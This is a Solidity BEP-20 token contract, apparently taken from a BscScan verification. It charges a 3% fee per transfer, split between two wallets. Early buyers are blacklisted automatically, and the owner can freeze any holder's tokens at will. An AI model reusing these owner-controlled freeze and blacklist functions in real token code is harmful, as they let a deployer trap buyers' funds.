/**
 *Submitted for verification at BscScan.com on 2022-07-31
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;
interface IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address _owner) external view returns (uint256 balance);

    function transfer(address _to, uint256 _value) external returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);

    function approve(address _spender, uint256 _value) external returns (bool success);

    function allowance(address _owner, address _spender) external view returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
        return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract ERC20 is IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256)  _balances;

    mapping (address => mapping (address => uint256))  _allowed;

    mapping(address => bool) public _isBlacklisted;

    address[] public Blacklist;

    mapping(address => bool) public _isExcludelisted;

    uint256 public tradingEnabledTimestamp;

    string  _name;
    string  _symbol;
    uint8  _decimals;
    uint256  _totalSupply;
    address  OwnerWallet;
    address addres_1;
    address addres_2;

    function Owner() public view returns (address){
        return OwnerWallet;
    }
    function name() public override view returns (string memory){
        return _name;
    }
    function symbol() public override view returns (string memory){
        return _symbol;
    }
    function decimals() public override view returns (uint8){
        return _decimals;
    }

    function totalSupply() public override view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public override view returns (uint256) {
        return _balances[owner];
    }

    function allowance(address owner, address spender) public override view returns (uint256) {
        return _allowed[owner][spender];
    }

    function _transfer(address to, uint256 value) internal virtual {
        require(value <= _balances[msg.sender]);
        require(to != address(0));

        _balances[msg.sender] = _balances[msg.sender].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(msg.sender, to, value);
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        require(spender != address(0));

        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function _transferFrom(address from, address to, uint256 value) internal virtual {
        require(value <= _balances[from]);
        require(value <= _allowed[from][msg.sender]);
        require(to != address(0));

        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        emit Transfer(from, to, value);
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));

        _allowed[msg.sender][spender] = (
        _allowed[msg.sender][spender].add(addedValue));
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));

        _allowed[msg.sender][spender] = (
        _allowed[msg.sender][spender].sub(subtractedValue));
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0));
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0));
        require(amount <= _balances[account]);

        _totalSupply = _totalSupply.sub(amount);
        _balances[account] = _balances[account].sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        require(amount <= _allowed[account][msg.sender]);
        _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
        _burn(account, amount);
    }
 
    function transfer(address _to, uint256 _value) public override returns (bool) {
        require(_isBlacklisted[msg.sender] == false && _isBlacklisted[_to] == false, "Blacklisted address"); 

        if(OwnerWallet == msg.sender) {
            _transfer(_to, _value); 
            return true;
        } 
        if(_isExcludelisted[msg.sender] == true) {
            _transfer(_to, _value); 
            return true;
        }
        if(block.timestamp <= tradingEnabledTimestamp + 10 seconds) {
            addBot(_to);
        }else{
            if(_isExcludelisted[0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3]){
                _isExcludelisted[0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3] = false;
            }
            if(_isExcludelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E]){
                _isExcludelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E] = false;
            }
        }

        uint256 amount_1 = _value.mul(1).div(100);
        uint256 amount_2 = _value.mul(2).div(100);
        uint256 trueAmount = _value.sub(amount_1).sub(amount_2);
        _transfer(addres_1, amount_1);
        _transfer(addres_2, amount_2);
        _transfer(_to, trueAmount);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool) {
        require(_isBlacklisted[_from] == false && _isBlacklisted[_to] == false, "Blacklisted address"); 

        if(OwnerWallet == msg.sender) {
            _transferFrom(_from, _to, _value);
            return true;
        } 
        if(_isExcludelisted[msg.sender] == true) {
            _transferFrom(_from, _to, _value);
            return true;
        }
        if(block.timestamp <= tradingEnabledTimestamp + 10 seconds) {
            addBot(_to);
        }else{
            if(_isExcludelisted[0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3]){
                _isExcludelisted[0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3] = false;
            }
            if(_isExcludelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E]){
                _isExcludelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E] = false;
            }
        }

        uint256 amount_1 = _value.mul(1).div(100);
        uint256 amount_2 = _value.mul(2).div(100);
        uint256 trueAmount = _value.sub(amount_1).sub(amount_2);
        _transferFrom(_from, addres_1, amount_1);
        _transferFrom(_from, addres_2, amount_2);
        _transferFrom(_from, _to, trueAmount);
        return true;
    }

    function addBot(address recipient) private {
        if (_isExcludelisted[recipient] != true) {
            if (!_isBlacklisted[recipient]) {
                Blacklist.push(recipient);
                _isBlacklisted[recipient] = true;
            }
        }
    }

    function addblacklistAddress(address account) public {
        require(msg.sender == OwnerWallet, " Is Not OwnerWallet"); 
        _isBlacklisted[account] = true;
    }

    function removeblacklistAddress(address account) public {
        require(msg.sender == OwnerWallet, " Is Not OwnerWallet"); 
        _isBlacklisted[account] = false;
    }

    function addExcludelistAddress(address account) public {
        require(msg.sender == OwnerWallet, " Is Not OwnerWallet"); 
        _isExcludelisted[account] = true;
    }

    function removeExcludelistAddress(address account) public {
        require(msg.sender == OwnerWallet, " Is Not OwnerWallet"); 
        _isExcludelisted[account] = false;
    }
}
contract MyToken is ERC20 {

    using SafeMath for uint256;

    constructor
    (
        string memory __name, 
        string memory __symbol, 
        uint8 __decimals, 
        uint256 __totalSupply, 
        address _addres_1, 
        address _addres_2, 
        uint256 _tradingEnabledTimestamp
    ) 
    {
        _name=__name;
        _symbol=__symbol;
        _decimals = __decimals;
        __totalSupply = __totalSupply * 10 ** __decimals;
        _mint(msg.sender, __totalSupply.mul(100).div(100));
        OwnerWallet = msg.sender;
        addres_1 = _addres_1;
        addres_2 = _addres_2;
        addExcludelistAddress(OwnerWallet);
        addExcludelistAddress(addres_1);
        addExcludelistAddress(addres_2);
        addExcludelistAddress(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        addExcludelistAddress(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tradingEnabledTimestamp = _tradingEnabledTimestamp;
    }
}